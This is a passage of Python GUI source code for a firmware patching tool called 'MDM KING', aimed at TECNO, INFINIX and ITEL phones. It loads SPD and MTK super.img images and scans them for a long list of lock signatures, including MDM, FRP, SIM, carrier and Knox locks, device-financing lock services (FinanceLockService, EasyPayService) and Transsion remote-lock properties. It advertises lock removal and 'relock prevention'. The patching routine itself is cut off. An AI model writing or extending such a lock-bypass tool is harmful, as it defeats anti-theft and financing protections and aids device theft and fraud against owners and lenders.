                    v = subprocess.run([p, 'version'], capture_output=True, text=True, timeout=3).stdout
                    if 'Android Debug Bridge' in v:
                        self._adb_path_cache = p
                        return p
                except Exception: pass
        try:
            from shutil import which
            path_adb = which('adb.exe')
            if path_adb:
                v = subprocess.run([path_adb, 'version'], capture_output=True, text=True, timeout=3).stdout
                if 'Android Debug Bridge' in v:
                    self._adb_path_cache = path_adb
                    return path_adb
        except Exception: pass
        self._adb_path_cache = None
        return None

    def _wireless_pair(self):
        adb = self._find_adb()
        if not adb: self.log('ADB not found', 'e'); return
        import tkinter.simpledialog
        addr = tkinter.simpledialog.askstring('Wireless ADB Pair', 'Enter IP:Port (e.g. 192.168.1.100:42339)\nPhone: Developer options → Wireless debugging → Pair with code', parent=self.root)
        if not addr: return
        code = tkinter.simpledialog.askstring('Wireless ADB Pair', 'Enter pairing code shown on phone:', parent=self.root)
        if not code: return
        self.log(f'Pairing with {addr}...', 'i')
        r = subprocess.run([adb, 'pair', addr, code], capture_output=True, text=True, timeout=30)
        if 'Successfully paired' in r.stdout:
            self.log_ok(f'Paired with {addr}')
        else:
            self.log(f'Pair failed: {r.stdout.strip() or r.stderr.strip() or "check IP and code"}', 'e')

    def _wireless_connect(self):
        adb = self._find_adb()
        if not adb: self.log('ADB not found', 'e'); return
        import tkinter.simpledialog
        addr = tkinter.simpledialog.askstring('Wireless ADB Connect', 'Enter IP:Port (e.g. 192.168.1.100:37373)\nPhone: Developer options → Wireless debugging → show IP:port below the code', parent=self.root)
        if not addr: return
        self.log(f'Connecting to {addr}...', 'i')
        r = subprocess.run([adb, 'connect', addr], capture_output=True, text=True, timeout=30)
        if 'connected' in r.stdout.lower():
            self.log_ok(f'Connected to {addr}')
            serials = [l.split()[0] for l in subprocess.run([adb, 'devices'], capture_output=True, text=True, timeout=15).stdout.split('\n')[1:] if l.strip() and 'device' in l]
            if serials: self.log(f'Device: {serials[0]}', 's')
        else:
            self.log(f'Connect failed: {r.stdout.strip() or r.stderr.strip() or "pair first"}', 'e')

    def _super_patch_menu(self):
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH)

        tk.Label(cw, text='SUPER PATCH', font=('Segoe UI', 18, 'bold'),
                 fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 5))
        tk.Label(cw, text='Select chipset', font=('Segoe UI', 10),
                 fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))

        row1 = tk.Frame(cw, bg=self.c['bg'])
        row1.pack(pady=4)
        for text, icon, color, cmd in [
            ('SPD Universal Patch', '🛡', self.c['blue'], self.super_image),
            ('MTK Super Patch', '📡', self.c['orange'], self._mtk_super_patch),
            ('Patch by Model', '📋', self.c['accent2'], self._patch_by_model),
        ]:
            def _handler(fn=cmd):
                for w in self.content.winfo_children():
                    w.destroy()
                fn()
            self._mkbtn(row1, f'{icon}  {text}', _handler,
                       wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)
        tk.Frame(cw, bg=self.c['border'], height=1).pack(fill=tk.X, padx=80, pady=10)
        row2 = tk.Frame(cw, bg=self.c['bg'])
        row2.pack(pady=4)
        self._mkbtn(row2, '🔧  Install SPD/Unisoc Drivers',
                   lambda: self._run_thread(self._spd_install_driver, 'SPD Driver'),
                   bg=self.c['surface2'], fg=self.c['fg'], wide=False, padx=10, pady=8).pack(side=tk.LEFT, padx=4)

    def _patch_by_model(self):
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH)

        tk.Label(cw, text='PATCH BY MODEL', font=('Segoe UI', 18, 'bold'),
                 fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 5))
        tk.Label(cw, text='Select your device brand', font=('Segoe UI', 10),
                 fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 20))

        brands = [
            ('TECNO', self.c['cyan'], 'mtk', []),
            ('INFINIX', self.c['yellow'], 'mtk', []),
            ('ITEL', self.c['green'], 'mtk', []),
        ]

        def _show_models(brand_name, models):
            for w in cw.winfo_children():
                w.destroy()
            tk.Label(cw, text=brand_name, font=('Segoe UI', 18, 'bold'),
                     fg=self.c['accent2'], bg=self.c['bg']).pack(pady=(30, 5))
            tk.Label(cw, text='Select your exact model', font=('Segoe UI', 10),
                     fg=self.c['muted'], bg=self.c['bg']).pack(pady=(0, 8))

            sc = tk.Canvas(cw, bg=self.c['bg'], highlightthickness=0)
            sc.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(20, 0))
            sb = tk.Scrollbar(cw, orient=tk.VERTICAL, command=sc.yview,
                              bg=self.c['surface'], troughcolor=self.c['bg'])
            sb.pack(side=tk.RIGHT, fill=tk.Y, padx=(0, 15), pady=5)
            sc.configure(yscrollcommand=sb.set)
            inner = tk.Frame(sc, bg=self.c['bg'])
            sc.create_window((0, 0), window=inner, anchor='nw', tags='inner')

            def _on_cfg(e):
                sc.configure(scrollregion=sc.bbox('all'))
            inner.bind('<Configure>', _on_cfg)

            if not models:
                placeholder = tk.Label(inner, text='No models added yet — check back later',
                        font=('Segoe UI', 12), fg=self.c['muted'], bg=self.c['bg'])
                placeholder.pack(pady=40)
            else:
                for model_name, model_desc, chipset in models:
                    def _pick(fn=self.super_image if chipset == 'spd' else self._mtk_super_patch):
                        for w in self.content.winfo_children():
                            w.destroy()
                        fn()
                    card = tk.Frame(inner, bg=self.c['card'], highlightbackground=self.c['accent2'], highlightthickness=1, cursor='hand2')
                    card.pack(fill=tk.X, padx=10, pady=3)
                    tk.Label(card, text=model_name, font=('Segoe UI', 12, 'bold'),
                             fg=self.c['accent2'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(6, 0))
                    tk.Label(card, text=model_desc, font=('Segoe UI', 9),
                             fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(0, 6))
                    chipset_label = 'SPD/UNISOC' if chipset == 'spd' else 'MTK/MEDIATEK'
                    chipset_color = self.c['blue'] if chipset == 'spd' else self.c['orange']
                    tk.Label(card, text=chipset_label, font=('Segoe UI', 8, 'bold'),
                             fg=chipset_color, bg=self.c['card']).pack(anchor='w', padx=16, pady=(0, 8))
                    card.bind('<Button-1>', lambda e, fn=_pick: fn())
                    for child in card.winfo_children():
                        child.bind('<Button-1>', lambda e, fn=_pick: fn())

            self._mkbtn(cw, '← BACK TO BRANDS', lambda: (_remove(), self._patch_by_model()),
                       bg=self.c['surface2'], fg=self.c['fg']).pack(pady=10)

        def _remove():
            for w in self.content.winfo_children():
                w.destroy()

        grid = tk.Frame(cw, bg=self.c['bg'])
        grid.pack(expand=True, fill=tk.BOTH, padx=30, pady=10)
        for i, (name, color, chipset, models) in enumerate(brands):
            row_idx = i // 4
            col_idx = i % 4
            if col_idx == 0:
                row_frame = tk.Frame(grid, bg=self.c['bg'])
                row_frame.pack(fill=tk.X, pady=4)
            card = tk.Frame(row_frame, bg=self.c['card'], highlightbackground=color, highlightthickness=1, cursor='hand2')
            card.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
            tk.Label(card, text=name, font=('Segoe UI', 12, 'bold'),
                     fg=color, bg=self.c['card']).pack(pady=(12, 2))
            tk.Label(card, text=f'{len(models)} models', font=('Segoe UI', 9),
                     fg=self.c['muted'], bg=self.c['card']).pack(pady=(0, 12))
            card.bind('<Button-1>', lambda e, n=name, m=models: _show_models(n, m))
            for child in card.winfo_children():
                child.bind('<Button-1>', lambda e, n=name, m=models: _show_models(n, m))

    def super_image(self):
        self.log('Super Image Patch — SPD/Unisoc Android 8-15', 'c')
        self._si_loaded_step = 0
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=25)
        
        # ── File Selection Card ──
        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(fill=tk.X, pady=(15, 8))
        tk.Label(card, text='  SELECT SUPER IMAGE', font=('Segoe UI', 8, 'bold'), fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(10, 4))
        self._si_name = tk.Label(card, text='No file selected', font=('Segoe UI', 13, 'bold'), fg=self.c['muted'], bg=self.c['card'])
        self._si_name.pack(anchor='w', padx=16)
        self._si_info = tk.Label(card, text='SPD/Unisoc super.img — Android 8→15 (sparse & raw)', font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['card'])
        self._si_info.pack(anchor='w', padx=16, pady=(2, 12))
        
        # ── Progress + Timer ──
        pb_trough = self.c['trough']
        s = ttk.Style()
        s.configure('pb_king.Horizontal.TProgressbar', troughcolor=pb_trough, background=self.c['accent'], bordercolor=pb_trough, lightcolor=pb_trough, darkcolor=pb_trough)
        pf = tk.Frame(cw, bg=self.c['bg'])
        pf.pack(fill=tk.X, pady=(5, 0))
        self._si_progress = ttk.Progressbar(pf, mode='determinate', style='pb_king.Horizontal.TProgressbar')
        self._si_progress.pack(fill=tk.X, ipady=8)
        self._si_pct = tk.Label(pf, text='0%', font=('Cascadia Code', 11, 'bold'), fg=self.c['blue'], bg=pb_trough)
        self._si_pct.place(relx=0.5, rely=0.5, anchor='center')
        
        # ── Live Dashboard ──
        dash_card = tk.Frame(cw, bg=self.c['card'])
        dash_card.pack(fill=tk.X, pady=(8, 0))
        dash_inner = tk.Frame(dash_card, bg=self.c['card'])
        dash_inner.pack(fill=tk.X, padx=12, pady=8)
        self._dash_labels = {}
        for key, label, color in [('status', 'STATUS', self.c['green']),
                                   ('patterns', 'LEVELS', self.c['orange']),
                                   ('elapsed', 'TIME', self.c['accent2']),
                                   ('output', 'OUTPUT', self.c['cyan'])]:
            f = tk.Frame(dash_inner, bg=self.c['bg_near_black'])
            f.pack(side=tk.LEFT, padx=6, ipadx=10, ipady=6, expand=True, fill=tk.X)
            tk.Label(f, text=label, font=('Segoe UI', 7, 'bold'), fg=color, bg=self.c['bg_near_black']).pack()
            l = tk.Label(f, text='—', font=('Cascadia Code', 12, 'bold'), fg=self.c['white'], bg=self.c['bg_near_black'])
            l.pack(pady=(2, 0))
            self._dash_labels[key] = l
        
        # ── Pattern Preview ──
        self._si_preview = tk.Label(cw, text='', font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['bg'])
        self._si_preview.pack()
        
        # ── Output Card ──
        self._out_card = tk.Frame(cw, bg=self.c['card'])
        self._out_card.pack_forget()
        tk.Label(self._out_card, text='  OUTPUT FILE', font=('Segoe UI', 8, 'bold'), fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(8, 2))
        self._out_path = tk.Label(self._out_card, text='', font=('Cascadia Code', 9), fg=self.c['green'], bg=self.c['card'], wraplength=500)
        self._out_path.pack(anchor='w', padx=16, pady=(2, 8))
        
        # ── Safety Badges (single line, centered) ──
        bf2 = tk.Frame(cw, bg=self.c['bg'])
        bf2.pack(fill=tk.X, pady=(8, 2))
        bf2_inner = tk.Frame(bf2, bg=self.c['bg'])
        bf2_inner.pack()
        badge_data = [('✓ Same-length', 'Byte-level match — no partition corruption', self.c['green']),
                      ('✓ No Bootloop', 'All patterns avoid framework classes', self.c['green']),
                      ('✓ No Relock', 'Scorpio strings removed at DEX level', self.c['green']),
                      ('✓ No Corrupt', 'Same-length replacements only', self.c['green']),
                      ('✓ Relock Prevention', 'Props injected + full-value zero + RC nuke + XML wipe', self.c['orange'])]
        for text, tip, color in badge_data:
            bd = tk.Frame(bf2_inner, bg=self.c['bg_near_black'])
            bd.pack(side=tk.LEFT, padx=4, ipadx=8, ipady=4)
            lbl = tk.Label(bd, text=text, font=('Segoe UI', 8), fg=color, bg=self.c['bg_near_black'])
            lbl.pack()
            lbl.bind('<Enter>', lambda e, t=tip: self._si_preview.config(text=t))
            lbl.bind('<Leave>', lambda e: self._si_preview.config(text=self._si_preview.cget('text')))

        # ── Step 1: Load ──
        self._si_file_status = tk.StringVar(value='No file loaded')
        step1_frame = tk.Frame(cw, bg=self.c['card'])
        step1_frame.pack(fill=tk.X, pady=(10, 4))
        step1_inner = tk.Frame(step1_frame, bg=self.c['card'])
        step1_inner.pack(fill=tk.X, padx=16, pady=10)
        tk.Label(step1_inner, text='Step 1', font=('Segoe UI', 11, 'bold'), fg=self.c['accent2'], bg=self.c['card']).pack(side=tk.LEFT, pady=6)
        self._si_status_lbl = tk.Label(step1_inner, textvariable=self._si_file_status, font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card'])
        self._si_status_lbl.pack(side=tk.LEFT, padx=(10, 16), pady=6)
        self._si_step1_btn = self._mkbtn(step1_inner, 'Load Step 1', lambda: self._si_select(1))
        self._si_step1_btn.pack(side=tk.RIGHT)
        
        # ── Step 2: Load (same function, different step) ──
        self._si_file_status2 = tk.StringVar(value='No file loaded')
        step2_frame = tk.Frame(cw, bg=self.c['card'])
        step2_frame.pack(fill=tk.X, pady=4)
        step2_inner = tk.Frame(step2_frame, bg=self.c['card'])
        step2_inner.pack(fill=tk.X, padx=16, pady=10)
        tk.Label(step2_inner, text='Step 2', font=('Segoe UI', 11, 'bold'), fg=self.c['green'], bg=self.c['card']).pack(side=tk.LEFT, pady=6)
        self._si_status_lbl2 = tk.Label(step2_inner, textvariable=self._si_file_status2, font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card'])
        self._si_status_lbl2.pack(side=tk.LEFT, padx=(10, 16), pady=6)
        self._si_step2_btn = self._mkbtn(step2_inner, 'Load Step 2', lambda: self._si_select(2))
        self._si_step2_btn.pack(side=tk.RIGHT)
        
        # ── Patch Now (center) ──
        patch_frame = tk.Frame(cw, bg=self.c['bg'])
        patch_frame.pack(pady=(14, 4))
        self._si_patch_btn = self._mkbtn(patch_frame, 'Patch Now', self._si_start, wide=True, state=tk.DISABLED)
        self._si_patch_btn.pack()
        
        self._pulse_on = False

        self._spinner_chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'
        self._spinner_idx = 0
        self._loading = False

    def _mtk_super_patch(self):
        self.log('Super Image Patch — MTK/MediaTek Android 8-15', 'c')
        self._mtk_path = None
        self._mtk_loaded_step = 1
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=25)

        # ── File Selection Card ──
        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(fill=tk.X, pady=(15, 8))
        tk.Label(card, text='  SELECT SUPER IMAGE', font=('Segoe UI', 8, 'bold'), fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(10, 4))
        self._mtk_name = tk.Label(card, text='No file selected', font=('Segoe UI', 13, 'bold'), fg=self.c['muted'], bg=self.c['card'])
        self._mtk_name.pack(anchor='w', padx=16)
        self._mtk_info = tk.Label(card, text='MTK/MediaTek super.img — Android 8→15 (sparse & raw)', font=('Segoe UI', 9), fg=self.c['muted'], bg=self.c['card'])
        self._mtk_info.pack(anchor='w', padx=16, pady=(2, 12))

        # ── Live Dashboard Card ──
        self._mtk_dash = tk.Frame(cw, bg=self.c['card'])
        self._mtk_dash.pack(fill=tk.X, pady=5)
        tk.Label(self._mtk_dash, text='  LIVE DASHBOARD', font=('Segoe UI', 8, 'bold'), fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(10, 4))
        dash_inner = tk.Frame(self._mtk_dash, bg=self.c['card'])
        dash_inner.pack(fill=tk.X, padx=16, pady=(4, 12))

        self._mtk_dash_labels = {}
        cols = [('status', '● STATUS'), ('patterns', '◆ LEVELS'), 
                ('elapsed', '⏱ TIME'), ('output', '📦 OUTPUT')]
        for col, (key, label) in enumerate(cols):
            f = tk.Frame(dash_inner, bg=self.c['bg_near_black'])
            f.pack(side=tk.LEFT, padx=10, ipadx=14, ipady=10, expand=True, fill=tk.X)
            tk.Label(f, text=label, font=('Segoe UI', 7, 'bold'), fg=self.c['green'], bg=self.c['bg_near_black']).pack()
            l = tk.Label(f, text='—', font=('Cascadia Code', 14, 'bold'), fg=self.c['white'], bg=self.c['bg_near_black'])
            l.pack(pady=(6, 0))
            self._mtk_dash_labels[key] = l

        # ── Progress + Timer ──
        pb_trough = self.c['trough']
        s = ttk.Style()
        s.configure('pb_king.Horizontal.TProgressbar', troughcolor=pb_trough, background=self.c['accent'], bordercolor=pb_trough, lightcolor=pb_trough, darkcolor=pb_trough)
        pf = tk.Frame(cw, bg=self.c['bg'])
        pf.pack(fill=tk.X, pady=(5, 0))
        self._mtk_progress = ttk.Progressbar(pf, mode='determinate', style='pb_king.Horizontal.TProgressbar')
        self._mtk_progress.pack(fill=tk.X, ipady=8)
        self._mtk_pct = tk.Label(pf, text='0%', font=('Cascadia Code', 11, 'bold'), fg=self.c['blue'], bg=pb_trough)
        self._mtk_pct.place(relx=0.5, rely=0.5, anchor='center')

        # ── Pattern Preview ──
        self._mtk_preview = tk.Label(cw, text='', font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['bg'])
        self._mtk_preview.pack()

        # ── Output Card ──
        self._mtk_out_card = tk.Frame(cw, bg=self.c['card'])
        self._mtk_out_card.pack_forget()
        tk.Label(self._mtk_out_card, text='  OUTPUT FILE', font=('Segoe UI', 8, 'bold'), fg=self.c['muted'], bg=self.c['card']).pack(anchor='w', padx=16, pady=(8, 2))
        self._mtk_out_path = tk.Label(self._mtk_out_card, text='', font=('Cascadia Code', 9), fg=self.c['green'], bg=self.c['card'], wraplength=500)
        self._mtk_out_path.pack(anchor='w', padx=16, pady=(2, 8))

        # ── Safety Badges (single line, centered) ──
        bf2 = tk.Frame(cw, bg=self.c['bg'])
        bf2.pack(fill=tk.X, pady=(8, 2))
        bf2_inner = tk.Frame(bf2, bg=self.c['bg'])
        bf2_inner.pack()
        badge_data = [('✓ Same-length', 'Byte-level match — no partition corruption', self.c['green']),
                      ('✓ No Bootloop', 'All patterns avoid framework classes', self.c['green']),
                      ('✓ No Relock', 'Scorpio strings removed at DEX level', self.c['green']),
                      ('✓ No Corrupt', 'Same-length replacements only', self.c['green']),
                      ('✓ Relock Prevention', 'Props injected + full-value zero + RC nuke + XML wipe', self.c['orange'])]
        for text, tip, color in badge_data:
            bd = tk.Frame(bf2_inner, bg=self.c['bg_near_black'])
            bd.pack(side=tk.LEFT, padx=4, ipadx=8, ipady=4)
            lbl = tk.Label(bd, text=text, font=('Segoe UI', 8), fg=color, bg=self.c['bg_near_black'])
            lbl.pack()
            lbl.bind('<Enter>', lambda e, t=tip: self._mtk_preview.config(text=t))
            lbl.bind('<Leave>', lambda e: self._mtk_preview.config(text=self._mtk_preview.cget('text')))

        # ── Load Step ──
        self._mtk_file_status = tk.StringVar(value='No file loaded')
        step_frame = tk.Frame(cw, bg=self.c['card'])
        step_frame.pack(fill=tk.X, pady=(10, 4))
        step_inner = tk.Frame(step_frame, bg=self.c['card'])
        step_inner.pack(fill=tk.X, padx=16, pady=10)
        tk.Label(step_inner, text='Step 1', font=('Segoe UI', 11, 'bold'), fg=self.c['accent2'], bg=self.c['card']).pack(side=tk.LEFT, pady=6)
        self._mtk_status_lbl = tk.Label(step_inner, textvariable=self._mtk_file_status, font=('Segoe UI', 8), fg=self.c['muted'], bg=self.c['card'])
        self._mtk_status_lbl.pack(side=tk.LEFT, padx=(10, 16), pady=6)
        self._mtk_load_btn = self._mkbtn(step_inner, 'Load Super', lambda: self._mtk_load())
        self._mtk_load_btn.pack(side=tk.RIGHT)

        # ── Patch Now (center) ──
        patch_frame = tk.Frame(cw, bg=self.c['bg'])
        patch_frame.pack(pady=(14, 4))
        self._mtk_patch_btn = self._mkbtn(patch_frame, 'Patch Now', self._mtk_patch, wide=True, state=tk.DISABLED)
        self._mtk_patch_btn.pack()

        self._mtk_pulse_on = False
        self._spinner_chars = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'

    def _mtk_load(self):
        path = filedialog.askopenfilename(title='Select MTK super image', filetypes=[('Super Image', '*.img *.bin'), ('All Files', '*.*')])
        if not path: return
        self._mtk_path = path
        sz = os.path.getsize(path)
        with open(path, 'rb') as f: hdr = f.read(4)
        fmt = 'Android Sparse' if hdr == b'\x3a\xff\x26\xed' else 'Raw'
        self._mtk_name.config(text=os.path.basename(path), fg=self.c['green'])
        self._mtk_info.config(text=f'{sz//(1024*1024)} MB  |  {fmt}  |  Ready to patch', fg=self.c['blue'])
        self._mtk_file_status.set(f'Loaded: {os.path.basename(path)} ({sz//(1024*1024)} MB)')
        self._mtk_patch_btn.config(state=tk.NORMAL)
        self._mtk_dash_labels['status'].config(text='READY', fg=self.c['green'])
        self.log(f'Loaded: {os.path.basename(path)} ({sz // (1024*1024)} MB)', 's')
        # Pre-scan patterns (first 128MB only — enough for build.prop and configs)
        try:
            scan_size = min(sz, 4 * 1024 * 1024)
            with open(path, 'rb') as f:
                pre = f.read(scan_size)
            self._mtk_pats = [
                    b'mdm_lock', b'mdm_locked', b'mdm_state', b'mdm_active',
                    b'region_lock', b'country_lock',
                    b'scorpio_lock', b'com.scorpio.securitycom',
                    b'com.scorpio.privatecomp',
                    b'knox_lock', b'knox_status', b'knox_guard',
                    b'transsion_lock', b'transsion_mdm',
                    b'carrier_lock', b'network_lock',
                    b'omadm_lock', b'omadm_locked',
                    b'sim_lock', b'frp_lock',
                    b'transecurity', b'tne_service', b'phasecheck_server',
                    b'securityplugin', b'SecurityPlugin',
                    b'fota_locked', b'fota_lock', b'diag_lock', b'diag_locked',
                    b'com.transsion.securityplugin',
                    b'SecurityPlugin.apk', b'securityplugin.apk', b'SecurityPluginService',
                    b'scorpio_securitycom', b'ScorpioSecurityManager',
                    b'persist.vendor.mdm', b'persist.mdm.',
                    b'persist.sys.keeplocked',
                    b'LockScreenService', b'LockCheckService',
                    b'wrapper_classes.dex', b'wrapper_classes2.dex',
                    b'SCORPIO_KEY', b'SCORPIO_PIN', b'SCORPIO_TOKEN',
                    b'enterprise.enrollment', b'knox_enrollment', b'mdm_enrollment',
                    b'enterpriseMDM', b'EnterpriseMdm',
                    b'persist.sys.oobe.devicelock',
                    b'ro.simlock.onekey',
                    b'ro.os.securitycom',
                    b'ro.griffin',
                    b'sys.mdm.lock', b'vendor.mdm.lock',
                    b'persist.security.',
                    b'persist.sys.trancritical', b'ro.transecurity',
                    b'persist.vendor.transecurity',
                    b'ro.tran_anti_spec', b'ro.tran_anti_nv_recover', b'ro.tran_anti_monitor',
                    b'ro.tran.pt_remote_lock',
                    b'FinanceLockService', b'EasyPayService',
                    b'securitycom.apk', b'SecurityCom.apk',
                    b'/product/priv-app/SecurityCom/SecurityCom.apk',
                    b'product/priv-app/SecurityCom/SecurityCom.apk',
                    b's\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00.\x00a\x00p\x00k\x00',
                    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00',
                    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00',
                    b'ro.boot.mdm_state', b'ro.boot.lock_state',
                    b'persist.sys.mdm',
                    b'uniber', b'tool_service', b'uniview', b'uniresctlopt',
                    b'tranlog', b'tnevservice', b'trancriticalparavfy',
                    b'ro.phoenix', b'persist.sys.phoenix',
                    b'persist.sys.cota', b'ro.cota',
                    b'persist.sys.tne', b'ro.tne',
                    # Latest Transsion/MTK Android 14+ patterns
                    b'com.transsion.mdm', b'com.transsion.oobe',
                    b'com.transsion.overlaysuw', b'com.transsion.systemupdate',
                    b'com.transsion.daemon', b'com.transsion.phoenix',
                    b'com.transsion.assistant', b'com.transsion.telephony',
                    b'com.transsion.itelephony',
                    b'com.cybercat.acbridge', b'com.cybercat.acbridgeoobe',
                    b'cybercat.acbridge', b'acbridgeoobe',
                    b'oobe_daemon', b'oobe_service', b'oobe_lock',
                    b'transsion_daemon', b'phoenix_daemon',
                    b'mdm_receiver', b'transsion_mdm_receiver',
                    b'persist.vendor.transsion.mdm',
                    b'ro.transsion.mdm', b'ro.transsion.lock',
                    b'persist.sys.oobe', b'persist.sys.oobe_complete',
                    b'vendor.transsion.security',
                    b'ro.vendor.transsion.mdm',
                    b'com.transsion.securityplugin', b'transsion.securityplugin',
                    b'android.uid.scorpio', b'permission.scorpio',
                    b'scorpio_permissions', b'scorpio_whitelist',]
            total = sum(1 for p in self._mtk_pats if p in pre)
            self._mtk_dash_labels['patterns'].config(text=f'Levels: {total}', fg=self.c['orange'])
            del pre
        except Exception: pass

    def _mtk_animate_spinner(self):
        if not getattr(self, '_mtk_loading', False): return
        self._mtk_spinner_idx = (self._mtk_spinner_idx + 1) % len(self._spinner_chars)
        self._mtk_preview.config(text='⏳ ' + self._spinner_chars[self._mtk_spinner_idx], fg=self.c['green'])
        self.root.after(100, self._mtk_animate_spinner)

    def _mtk_neon_tick(self):
        if not getattr(self, '_mtk_neon_active', False): return
        self._mtk_neon_idx = (self._mtk_neon_idx + 1) % 5
        colors = ['#00ffff', '#ff00ff', '#ffcc00', '#00ff88', '#ff004d']
        self.log_text.tag_config('neon_big', foreground=colors[self._mtk_neon_idx])
        self.log_text.tag_config('neon_sub', foreground=colors[(self._mtk_neon_idx + 2) % 5])
        self.root.after(400, self._mtk_neon_tick)

    def _mtk_patch(self):
        if not self._mtk_path or not os.path.isfile(self._mtk_path):
            self.log('No file loaded', 'e'); return
        self.log_text.delete('1.0', tk.END)
        self._mtk_neon_active = True
        self._mtk_neon_idx = 0
        self._mtk_loading = True
        self._mtk_cancel_flag = False
        self._mtk_spinner_idx = 0
        self._mtk_patch_btn.config(state=tk.DISABLED)
        self.log_text.insert(tk.END, '══════  MDM KING PATCHING  ══════\n\n', 'neon_big')
        self.log_text.insert(tk.END, '     Just sit back relax while tool is patching\n\n', 'neon_sub')
        self.log_text.tag_config('neon_big', foreground=NEONS[0], font=('Consolas', 20, 'bold'))
        self.log_text.tag_config('neon_sub', foreground=NEONS[1], font=('Consolas', 10))
        self._mtk_progress['value'] = 0
        self._mtk_pct.config(text='0%')
        self._start_time = time.time()
        self._mtk_animate_spinner()
        self._mtk_neon_tick()
        for k in self._mtk_dash_labels: self._mtk_dash_labels[k].config(text='—')
        threading.Thread(target=self._mtk_do_patch, daemon=True).start()

    def _mtk_do_patch(self):
        if not self._mtk_path: return
        ctx = {
            'dash': self._mtk_dash_labels,
            'progress': self._mtk_progress,
            'pct': self._mtk_pct,
            'btn': self._mtk_patch_btn,
            'out_card': self._mtk_out_card,
            'out_path': self._mtk_out_path,
            'out_suffix': '_patched',
            'neon_attr': '_mtk_neon_active',
            'loading_attr': '_mtk_loading',
            'cancel_attr': '_mtk_cancel_flag',
            'label': 'MTK',
        }
        with self._block_close_ctx():
            try:
                self._do_auto_super_patch(self._mtk_path, ctx)
            except BaseException:
                import traceback
                try:
                    with open('mdm_king_crash.log', 'w') as f:
                        traceback.print_exc(file=f)
                except Exception: pass

    def _partition_tool(self):
        self.log('Miscdata / Proinfo Patcher', 'c')
        cw = tk.Frame(self.content, bg=self.c['bg'])
        cw.pack(expand=True, fill=tk.BOTH, padx=25)

        card = tk.Frame(cw, bg=self.c['card'])
        card.pack(fill=tk.X, pady=(15, 8))
        tk.Label(card, text='PARTITION PATCHER', font=('Segoe UI', 20, 'bold'),
                 fg=self.c['accent2'], bg=self.c['card']).pack(pady=(24, 4))
        tk.Label(card, text='Remove lock flags from partition dumps',
                 font=('Segoe UI', 10), fg=self.c['muted'], bg=self.c['card']).pack(pady=(0, 10))
        tk.Frame(card, bg=self.c['border'], height=1).pack(fill=tk.X, padx=40, pady=(4, 14))

        tk.Label(card, text='SELECT PARTITION TYPE', font=('Segoe UI', 8, 'bold'),
                 fg=self.c['muted'], bg=self.c['card']).pack(pady=(4, 8))

        btn_row = tk.Frame(card, bg=self.c['card'])
        btn_row.pack(pady=(0, 16))

        def _make_btn(parent, text, color, part_type):
            btn = tk.Button(parent, text=f'  {text}  ', font=('Segoe UI', 10, 'bold'),
                            bg=self.c['surface2'], fg=color, bd=0,
                            padx=20, pady=8, cursor='hand2',
                            command=lambda: self._run_thread(lambda: self._patch_miscdata_proinfo(part_type), 'Partition'))
            btn.pack(side=tk.LEFT, padx=8)

        _make_btn(btn_row, 'PATCH MISCDATA', self.c['green'], 'miscdata')
        _make_btn(btn_row, 'PATCH PROINFO', self.c['accent2'], 'proinfo')

    def _set_icon(self, win):
        if self._ico_path and os.path.isfile(self._ico_path):
            try:
                win.iconbitmap(self._ico_path)
                return
            except Exception:
                pass
        if self._app_icon_tk:
            try:
                win.iconphoto(True, self._app_icon_tk)
                return
            except Exception:
                pass
        # Ultimate fallback: 1x1 transparent GIF
        try:
            import base64
            _px = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
            _blank = tk.PhotoImage(data=_px)
            win.iconphoto(True, _blank)
        except Exception:
            pass

    def _pulse_btn(self):
        if not getattr(self, '_loading', False) and hasattr(self, '_si_patch_btn'):
            self._pulse_on = not self._pulse_on
            self._si_patch_btn.config(bg=self.c['green'] if self._pulse_on else '#1a8a3a')
            self.root.after(500, self._pulse_btn)

    def _si_select(self, step=1):
        path = filedialog.askopenfilename(title='Select super image',
            filetypes=[('Super Image', '*.img *.bin'), ('All Files', '*.*')])
        if not path: return
        size = os.path.getsize(path)
        self._super_path = path
        with open(path, 'rb') as f: hdr = f.read(4)
        fmt = 'Android Sparse' if hdr == b'\x3a\xff\x26\xed' else 'Raw'
        self._si_name.config(text=f'{os.path.basename(path)}', fg=self.c['green'])
        self._si_info.config(text=f'{size//(1024*1024)} MB  |  {fmt}  |  Ready to patch', fg=self.c['blue'])
        # Update step card status labels
        status_txt = f'Loaded: {os.path.basename(path)} ({size//(1024*1024)} MB)'
        if step == 1:
